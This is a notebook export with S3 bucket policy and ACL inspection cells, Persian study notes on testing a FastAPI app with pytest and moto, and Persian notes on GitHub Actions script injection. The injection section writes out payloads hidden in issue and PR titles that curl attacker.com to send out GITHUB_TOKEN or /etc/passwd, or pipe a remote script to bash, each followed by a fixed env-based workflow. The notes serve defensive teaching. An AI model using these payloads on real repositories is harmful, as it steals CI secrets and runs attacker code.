In [1]:
import boto3
import logging 
from config import settings

In [2]:
s3_resource = boto3.resource(
	"s3",
	region_name=settings.s3_region,
	endpoint_url=settings.s3_endpoint_url,
	aws_access_key_id=(
     
		settings.s3_access_key_id.get_secret_value()
		if settings.s3_access_key_id
		else None
	),
	aws_secret_access_key=(
		settings.s3_secret_access_key.get_secret_value()
		if settings.s3_secret_access_key
		else None
	),
)

bucket_name = settings.s3_bucket_name

In [3]:
bucket_policy = s3_resource.BucketPolicy(bucket_name)
bucket_policy.load()
bucket_policy.policy

'{"Version": "2012-10-17", "Statement": [{"Sid": "PublicReadProfilePics", "Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::fastapi-blog-uploads/profile_pics/*"}]}'

In [7]:
bucket_acl = s3_resource.BucketAcl(bucket_name)
bucket_acl.grants

[{'Grantee': {'Type': 'Group',
   'URI': 'http://acs.amazonaws.com/groups/global/AllUsers'},
  'Permission': 'READ'},
 {'Grantee': {'DisplayName': 'amirali miri',
   'ID': '8a25edbe-4882-4c21-8dfb-856ba4cb869c',
   'Type': 'CanonicalUser'},
  'Permission': 'FULL_CONTROL'}]

<style>
.bigtitle {
    direction: rtl;
    text-align: right;
    font-weight: bold;
    font-size: 20px;
}

.title {
    direction: rtl;
    text-align: right;
    font-weight: bold;
    font-size: 18px;
}

.subtitle {
    direction: rtl;
    text-align: right;
    font-family: Vazir, Tahoma, sans-serif;
    font-size: 16px;
}
</style>




<div class="subtitle">

# خلاصه کامل آموزش تست در FastAPI

این آموزش درباره تست کردن یک اپلیکیشن FastAPI با استفاده از **Pytest**، **Fixtures** و **Mocking** سرویس‌های خارجی است. در ادامه تمام مفاهیم مهم را دسته‌بندی شده توضیح می‌دهم.

---

## ۱. چرا تست کردن مهم است؟

- اپلیکیشن ما الان کامل شده: احراز هویت، PostgreSQL با Alembic، آپلود تصویر در AWS S3 و الگوهای async.
- با اضافه شدن فیچرها، احتمال خرابی زیاد می‌شود.
- تست به ما اطمینان می‌دهد که اپ درست کار می‌کند، باگ‌های ناشناخته را پیدا می‌کند و اجازه refactor بدون نگرانی می‌دهد.
- در پروژه‌های واقعی و تیمی، تست اختیاری نیست.

---

## ۲. نصب dependencies

```bash
uv add --dev pytest
uv add --dev "moto[s3]"
```

- `pytest`: فریمورک تست
- `moto`: کتابخانه‌ای که سرویس‌های AWS را mock می‌کند (فقط بخش S3 لازم است)

**نکات مهم:**
- نیازی به نصب جداگانه `httpx` نیست (با FastAPI standard نصب شده).
- `httpx` همراه با `anyio` می‌آید که پلاگین Pytest برای تست‌های async دارد.
- اگر `pytest-asyncio` نصب دارید و `asyncio_mode = auto` تنظیم کرده‌اید، آن را حذف کنید چون با پلاگین AnyIO تعارض دارد.

---

## ۳. ساختار پوشه تست

```
test/
├── __init__.py
├── conftest.py          # fixtures مشترک
├── test_post.py         # تست روت‌های پست
├── test_users.py        # تست روت‌های کاربر
└── test_image.jpeg      # تصویر یک پیکسلی برای تست آپلود
```

- پیشوند `test_` برای Pytest مهم است (کشف خودکار).
- فایل‌های تست آینه‌ی ساختار routers هستند.

---

## ۴. رویکرد Sync در مقابل Async

### رویکرد Sync (ساده ولی محدود)
```python
from fastapi.testclient import TestClient

def test_homepage():
    response = client.get("/")
    assert response.status_code == 200
```
- از `assert` ساده پایتون استفاده می‌کند (به جای `self.assertEqual` در unittest).
- اگر اپ async باشد (async engine، async session)، پل زدن بین sync و async دردناک می‌شود.

### رویکرد Async (انتخاب ما)
- از `httpx.AsyncClient` استفاده می‌کنیم تا همه چیز در دنیای async بماند.

---

## ۵. فایل conftest.py — قلب تست

### الف) تنظیم environment variables (قبل از هر import)

```python
import os
os.environ["DATABASE_URL"] = "postgresql+asyncpg://...test_blog"
os.environ["S3_BUCKET_NAME"] = "test-bucket"
os.environ["SECRET_KEY"] = "test-secret-key"
os.environ["S3_ACCESS_KEY_ID"] = "testing"
os.environ["S3_SECRET_ACCESS_KEY"] = "testing"
os.environ["AWS_ACCESS_KEY_ID"] = "testing"
os.environ["AWS_SECRET_ACCESS_KEY"] = "testing"
os.environ["AWS_DEFAULT_REGION"] = "us-east-1"
```

**چرا مهم است؟**
- `Settings` با Pydantic در زمان instantiate شدن، env vars را می‌خواند.
- اگر اول اپ را import کنیم، تنظیمات production (.env) بارگذاری می‌شود — که برای تست فاجعه است.
- پس **ترتیب import خیلی مهم است**: اول env vars، بعد import از app.

**دو دسته متغیر چرا؟**
- `S3_*`: برای Pydantic Settings اپ
- `AWS_*`: برای Boto3 که credential chain خودش را دارد

### ب) فعال‌سازی پلاگین AnyIO

```python
pytest_plugins = ("anyio",)
```
- اجازه می‌دهد تست‌های async بنویسیم.
- دکوراتور `@pytest.mark.anyio` روی تست‌های async می‌گذاریم.

### ج) انتخاب backend async

```python
@pytest.fixture(scope="session")
def anyio_backend():
    return "asyncio"
```
- AnyIO از چند backend پشتیبانی می‌کند؛ ما asyncio می‌خواهیم.
- `scope="session"` یعنی یک event loop برای کل تست session.

---

## ۶. استراتژی دیتابیس تست

### چرا دیتابیس جدا؟
- تست‌ها داده‌های زیادی می‌سازند و پاک می‌کنند.
- نباید به دیتابیس dev/prod دست بزنند.
- از **PostgreSQL جداگانه** (`test_blog`) استفاده می‌کنیم، نه SQLite — چون رفتار SQLite با Postgres فرق دارد و ممکن است تست لوکال پاس شود ولی prod بشکند.

### ساخت دیتابیس تست
```bash
createdb test_blog -O blog_user
```

### الگوی Transactional Rollback (استاندارد صنعتی)

1. **یک بار** در ابتدای session همه جدول‌ها ساخته می‌شوند.
2. هر تست داخل یک transaction اجرا می‌شود.
3. بعد از هر تست، transaction rollback می‌شود (همه چیز پاک).
4. در پایان session، همه جدول‌ها drop می‌شوند.

**مزیت:** بسیار سریع‌تر از ساخت/حذف جدول برای هر تست + بدون نگرانی از ترتیب foreign key.

---

## ۷. Fixtures دیتابیس

### الف) Engine (session-scoped)

```python
@pytest.fixture(scope="session")
def test_engine():
    engine = create_async_engine(TEST_DATABASE_URL, poolclass=NullPool)
    yield engine
    # cleanup
```

- `NullPool`: connection pooling را غیرفعال می‌کند تا مشکل connection stale بین تست‌ها نباشد.
- **نکته مهم:** scope باید با `anyio_backend` یکی باشد (session)، وگرنه خطای «event loop is closed» می‌گیرید.

### ب) ساخت و drop جدول‌ها

```python
@pytest.fixture(scope="session")
def setup_database(test_engine):
    async def create():
        async with test_engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
    asyncio.run(create())
    yield
    # drop tables + dispose engine
```

- `run_sync` چون `create_all` sync است.
- `yield` جایی است که تست‌ها اجرا می‌شوند.

### ج) Session با rollback (function-scoped) — مهم‌ترین fixture

```python
@pytest.fixture
async def db_session(test_engine, setup_database):
    connection = await test_engine.connect()
    transaction = await connection.begin()
    session = AsyncSession(bind=connection, join_transaction_mode="create_savepoint")
    yield session
    await session.close()
    await transaction.rollback()
    await connection.close()
```

**نکته کلیدی:** `join_transaction_mode="create_savepoint"`
- وقتی کد اپ `session.commit()` صدا می‌زند، SQLAlchemy به جای commit واقعی، savepoint می‌سازد.
- داده‌ها از دید اپ commit شده به نظر می‌رسند ولی در واقعیت چیزی commit نشده.
- در پایان، rollback همه چیز را پاک می‌کند.

---

## ۸. Mock کردن AWS S3 با Moto

```python
@pytest.fixture
def mocked_aws():
    with mock_aws():
        s3 = boto3.client("s3", region_name="us-east-1")
        s3.create_bucket(Bucket=os.environ["S3_BUCKET_NAME"])
        yield s3
```

- Moto تمام تماس‌های boto3 را رهگیری و به یک محیط in-memory هدایت می‌کند.
- این fixture **sync** است (نه async) چون `mock_aws` یک context manager sync است.
- function-scoped: هر تست S3 خالی و تازه می‌گیرد.

---

## ۹. Fixture اصلی client (Dependency Override)

```python
@pytest.fixture
async def client(db_session):
    async def override_get_db():
        yield db_session

    app.dependency_overrides[get_db] = override_get_db
    async with AsyncClient(
        transport=ASGITransport(app=app),
        base_url="http://test"
    ) as ac:
        yield ac
    app.dependency_overrides.clear()
```

**نکات:**
- `dependency_overrides`: دیکشنری FastAPI که اجازه می‌دهد `get_db` واقعی را با نسخه تستی عوض کنیم.
- `ASGITransport`: درخواست‌ها را مستقیم در حافظه به اپ می‌فرستد — بدون سرور واقعی، بدون شبکه.
- `base_url` الزامی است (برای redirect و URL نسبی).
- **نکته:** lifespan events اجرا نمی‌شوند (که برای ما مشکلی نیست).

---

## ۱۰. Helperهای احراز هویت

```python
async def create_test_user(client, username="testuser", email="test@example.com", password="testpassword123"):
    response = await client.post("/api/users", json={...})
    assert response.status_code == 201, response.text
    return response.json()

async def login_user(client, email="test@example.com", password="testpassword123"):
    response = await client.post("/api/users/token", data={...})  # data نه json!
    assert response.status_code == 200
    return response.json()["access_token"]

def auth_header(token):
    return {"Authorization": f"Bearer {token}"}
```

**نکته مهم:** login از `data=` استفاده می‌کند (form data) نه `json=` چون OAuth2 password flow اینطور است.

---

## ۱۱. نمونه تست‌ها

### تست خواندن (GET)
```python
@pytest.mark.anyio
async def test_get_posts_empty(client: AsyncClient):
    response = await client.get("/api/posts")
    assert response.status_code == 200
    data = response.json()
    assert data["posts"] == []
    assert data["total"] == 0
    assert data["has_more"] is False
```

### تست 404
```python
@pytest.mark.anyio
async def test_get_post_not_found(client):
    response = await client.get("/api/posts/999")
    assert response.status_code == 404
    assert response.json()["detail"] == "Post not found"
```

### تست ایجاد پست (با auth)
```python
@pytest.mark.anyio
async def test_create_post_success(client):
    user = await create_test_user(client)
    token = await login_user(client)
    response = await client.post("/api/posts", json={...}, headers=auth_header(token))
    assert response.status_code == 201
    # بررسی فیلدها...
```

### تست 401 (بدون auth)
```python
response = await client.post("/api/posts", json={...})
assert response.status_code == 401
```

### تست 403 (عدم مالکیت)
- دو کاربر بساز، با یکی پست بساز، با دیگری سعی کن ویرایش کنی → 403.

### تست Pagination
- ۵ پست بساز، سپس با `limit`، `skip` و ترکیبشان تست کن.
- `total` = کل پست‌ها، `has_more` = آیا پست بیشتری هست.

### تست Validation (422) در مقابل Business Rule (400)
- 422: فیلدهای ناقص (Pydantic validation).
- 400: داده معتبر است ولی قانون اپ را نقض می‌کند (مثل email تکراری).

### تست امنیتی: پسورد در response نباشد
```python
assert "password" not in data
assert "password_hash" not in data
```

### تست آپلود فایل
```python
image_bytes = Path(__file__).parent.joinpath("test_image.jpeg").read_bytes()
response = await client.patch(
    f"/api/users/{user['id']}",
    files={"file": ("profile.jpeg", BytesIO(image_bytes), "image/jpeg")},
    headers=auth_header(token)
)
# بررسی response
# بررسی side effect در S3 mock
objects = mocked_aws.list_objects_v2(Bucket=...)
assert len(objects["Contents"]) == 1
```

### تست Background Task (Mock کردن ایمیل)

```python
with patch("routers.users.send_password_reset_email", new_callable=AsyncMock) as mock_send:
    response = await client.post("/api/users/forgot-password", json={"email": ...})
    assert response.status_code == 202
    mock_send.assert_awaited_once()
```

**نکته حیاتی Mocking:** «جایی که اسم lookup می‌شود را patch کن، نه جایی که تابع تعریف شده.»
- تابع در `email_utils` تعریف شده، ولی در `routers.users` import شده.
- پس `routers.users.send_password_reset_email` را patch می‌کنیم.
- دلیل: `from email_utils import send_password_reset_email` یک reference جدید در namespace ماژول router می‌سازد.

---

## ۱۲. دستورات و گزینه‌های Pytest

```bash
uv run pytest test/ -v                    # همه تست‌ها با جزئیات
uv run pytest test/test_post.py           # فقط یک فایل
uv run pytest test/test_post.py::test_get_posts_empty  # یک تست خاص
uv run pytest test/                       # بدون -v: نمایش نقطه‌ای
uv run pytest test/ -s                    # نمایش print output
```

---

## ۱۳. الگوهای کلیدی که یاد گرفتیم

| الگو | توضیح |
|------|--------|
| **Transactional Rollback** | هر تست در یک transaction، rollback بعد از تست |
| **Dependency Override** | جایگزینی `get_db` واقعی با session تستی |
| **ASGI Transport** | درخواست مستقیم در حافظه بدون سرور |
| **Mock AWS با Moto** | تست S3 بدون تماس با AWS واقعی |
| **Mock Background Tasks** | `AsyncMock` + `patch` در محل استفاده |
| **Helperهای Auth** | ایجاد کاربر، لاگین، ساخت header |
| **Scope Matching** | scope fixtureها باید هماهنگ باشند تا خطای event loop ندهیم |

---

## ۱۴. جمع‌بندی و ادامه مسیر

- در `conftest.py`: env vars، engine، setup_database، db_session، mocked_aws، client و helperها را ساختیم.
- تست‌هایی برای post و users با تکنیک‌های مختلف نوشتیم.
- تست ۱۰۰٪ coverage هدف این ویدیو نبود؛ هدف یادگیری **الگوها** بود.
- پیشنهاد: برای سایر endpointها خودتان تست بنویسید.
- AI (مثل Claude) می‌تواند در پیدا کردن edge caseهای فراموش‌شده کمک کند.
- ویدیو بعدی: **Deploy روی VPS**، و بعد از آن **Docker و cloud**.

---

## ۱۵. تست‌های Sync در مقابل Async — خلاصه

| ویژگی | TestClient (Sync) | AsyncClient (Async) |
|--------|-------------------|---------------------|
| سادگی | ساده‌تر | کمی پیچیده‌تر |
| مناسب برای | اپ‌های sync | اپ‌های async (مثل ما) |
| DB async | نیاز به پل زدن | یکپارچه |
| سرعت | خوب | خوب |

---

اگر بخش خاصی از این مفاهیم را می‌خواهی عمیق‌تر توضیح بدهم (مثلاً الگوی transactional rollback یا mocking)، بگو تا با مثال کد بیشتری باز کنم.

</div>



<style>
.bigtitle {
    direction: rtl;
    text-align: right;
    font-weight: bold;
    font-size: 20px;
}

.title {
    direction: rtl;
    text-align: right;
    font-weight: bold;
    font-size: 18px;
}

.subtitle {
    direction: rtl;
    text-align: right;
    font-family: Vazir, Tahoma, sans-serif;
    font-size: 16px;
}
</style>




<div class="subtitle">

# Script Injection در GitHub Actions

یکی از رایج‌ترین و خطرناک‌ترین آسیب‌پذیری‌ها در GitHub Actions، **Script Injection** هست. این آسیب‌پذیری وقتی رخ می‌ده که ورودی‌های غیرقابل اعتماد (مثل عنوان Issue، نام Branch، محتوای Commit Message و...) مستقیم داخل `run:` یا `script:` تزریق بشن.

## ریشه مشکل

GitHub یه سری **Context** داره که مقدارشون توسط کاربر قابل کنترله:

- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.head_ref` (نام branch در PR)
- `github.event.pull_request.head.ref`
- `github.event.commits[*].message`
- `github.event.discussion.title`

وقتی اینا رو مستقیم تو یه اسکریپت shell یا JS بذاری، مهاجم می‌تونه کد دلخواه تزریق کنه.

---

## مثال آسیب‌پذیر (Vulnerable)

فرض کن یه workflow داری که وقتی Issue جدید باز می‌شه، عنوانش رو echo می‌کنه:

```yaml
name: Vulnerable Workflow

on:
  issues:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Echo issue title
        run: echo "New issue: ${{ github.event.issue.title }}"
```

الان یه مهاجم یه Issue با این عنوان باز می‌کنه:

```
"; curl http://attacker.com/steal?token=${{ secrets.GITHUB_TOKEN }} #
```

در نتیجه اسکریپتی که اجرا می‌شه این می‌شه:

```bash
echo "New issue: "; curl http://attacker.com/steal?token=ghs_xxxx #
```

و توکن به سرور مهاجم ارسال می‌شه. 😱

حتی بدتر، مهاجم می‌تونه دستورات مخرب‌تری اجرا کنه:

```
$(curl -s http://attacker.com/payload.sh | bash)
```

یا مثلاً اطلاعاتی مثل `GITHUB_TOKEN`, `AWS_ACCESS_KEY_ID` و... که به عنوان secret تو محیط workflow هستن رو استخراج کنه.

---

## نسخه امن (Fixed)

راه‌حل استاندارد: **مقادیر غیرقابل اعتماد رو از طریق `env` پاس بده**، نه مستقیم تو `run`.

```yaml
name: Safe Workflow

on:
  issues:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Echo issue title
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "New issue: $ISSUE_TITLE"
```

چرا امن هست؟ چون GitHub مقدار `ISSUE_TITLE` رو به صورت **متغیر محیطی** ست می‌کنه و shell اون رو به عنوان کد تفسیر نمی‌کنه. حتی اگه مقدارش `"; rm -rf /` باشه، فقط یه رشته‌ست که echo می‌شه.

---

## یه مثال واقعی‌تر: PR Title

```yaml
# ❌ آسیب‌پذیر
- name: Check PR title
  run: |
    if [[ "${{ github.event.pull_request.title }}" == *"WIP"* ]]; then
      echo "Work in progress!"
    fi
```

مهاجم PR با این عنوان باز می‌کنه:

```
"; curl http://attacker.com/$(cat /etc/passwd | base64) #
```

**نسخه امن:**

```yaml
# ✅ امن
- name: Check PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    if [[ "$PR_TITLE" == *"WIP"* ]]; then
      echo "Work in progress!"
    fi
```

---

## حالت خاص: Actions و JS

اگه از `actions/github-script` استفاده می‌کنی، همین مشکل با `${{ }}` تو `script:` هم وجود داره:

```yaml
# ❌ آسیب‌پذیر
- uses: actions/github-script@v7
  with:
    script: |
      const title = "${{ github.event.issue.title }}";
      console.log(title);
```

**نسخه امن:** از `context` استفاده کن:

```yaml
# ✅ امن
- uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.issue.title;
      console.log(title);
```

---

## چک‌لیست برای جزوه‌ت

1. **هرگز** `${{ github.event.* }}` رو مستقیم تو `run:` نذار.
2. همیشه از `env:` واسطه استفاده کن.
3. تو `github-script`، از `context.payload` استفاده کن نه interpolation.
4. برای input های workflow (`workflow_dispatch`, `workflow_call`) هم همین قاعده برقراره — `${{ inputs.foo }}` هم می‌تونه خطرناک باشه.
5. ابزارهایی مثل [`actionlint`](https://github.com/rhysd/actionlint) و [`zizmor`](https://github.com/woodruffw/zizmor) این نوع مشکل رو detect می‌کنن — خوبه که به جزوه‌ت به‌عنوان ابزار پیشنهادی اضافه‌شون کنی.

---

## یه نکته برای جزوه: چرا `env` امنه؟

چون وقتی GitHub یه env var ست می‌کنه، مقدار رو از طریق یه مکانیزم جدا (مثل فایل یا API سیستمی) به process پاس می‌ده، نه از طریق string interpolation تو script. پس حتی کاراکترهایی مثل `"`, `` ` ``, `$()`, `;` هم فقط داده‌ی خام محسوب می‌شن.

---

اگه خواستی، می‌تونم یه بخش «مقایسه Attack Surface های مختلف» (issue vs PR vs comment vs workflow_dispatch) هم برات بنویسم که تو جزوه ازش استفاده کنی.


<div/>

<style>
.bigtitle {
    direction: rtl;
    text-align: right;
    font-weight: bold;
    font-size: 20px;
}

.title {
    direction: rtl;
    text-align: right;
    font-weight: bold;
    font-size: 18px;
}

.subtitle {
    direction: rtl;
    text-align: right;
    font-family: Vazir, Tahoma, sans-serif;
    font-size: 16px;
}
</style>




<div class="subtitle">

<div/>